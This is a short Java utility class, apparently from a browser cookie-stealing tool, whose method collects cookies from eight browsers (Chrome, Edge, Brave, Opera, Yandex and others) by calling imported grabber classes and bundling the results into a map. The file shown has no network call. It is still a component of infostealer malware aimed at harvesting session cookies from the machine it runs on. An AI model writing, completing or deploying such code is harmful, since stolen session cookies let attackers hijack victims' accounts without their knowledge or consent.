package io.github.luxotick.utils;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import io.github.luxotick.impl.cookies.*;
import java.util.HashMap;
import java.util.Map;

public class util {
    public static Map<String, String> getAllBrowserCookies() {
        Gson gson = new GsonBuilder().disableHtmlEscaping().create();

        String brave = new Brave().grabCookies(); String chrome = new Chrome().grabCookies(); String chromium = new Chromium().grabCookies(); String edge = new Edge().grabCookies(); String opera = new Opera().grabCookies(); String operagx = new OperaGX().grabCookies(); String vivaldi = new Vivaldi().grabCookies();String yandex = new Yandex().grabCookies();
        String braveCookies = gson.toJson(brave); String chromeCookies = gson.toJson(chrome); String chromiumCookies = gson.toJson(chromium); String edgeCookies = gson.toJson(edge); String operaCookies = gson.toJson(opera); String operaGXCookies = gson.toJson(operagx); String vivaldiCookies = gson.toJson(vivaldi); String yandexCookies = gson.toJson(yandex);

        Map<String, String> encodedCookies = new HashMap<>();
        // Populate the encodedCookies map with the encoded cookie data as strings
        encodedCookies.put("BRAVE", braveCookies.replaceAll("\"", ""));
        encodedCookies.put("CHROME", chromeCookies.replaceAll("\"", ""));
        encodedCookies.put("CHROMIUM", chromiumCookies.replaceAll("\"", ""));
        encodedCookies.put("EDGE", edgeCookies.replaceAll("\"", ""));
        encodedCookies.put("OPERA", operaCookies.replaceAll("\"", ""));
        encodedCookies.put("OPERAGX", operaGXCookies.replaceAll("\"", ""));
        encodedCookies.put("VIVALDI", vivaldiCookies.replaceAll("\"", ""));
        encodedCookies.put("YANDEX", yandexCookies.replaceAll("\"", ""));
        // Add other browsers and their corresponding encoded cookie data

        return encodedCookies;
    }
}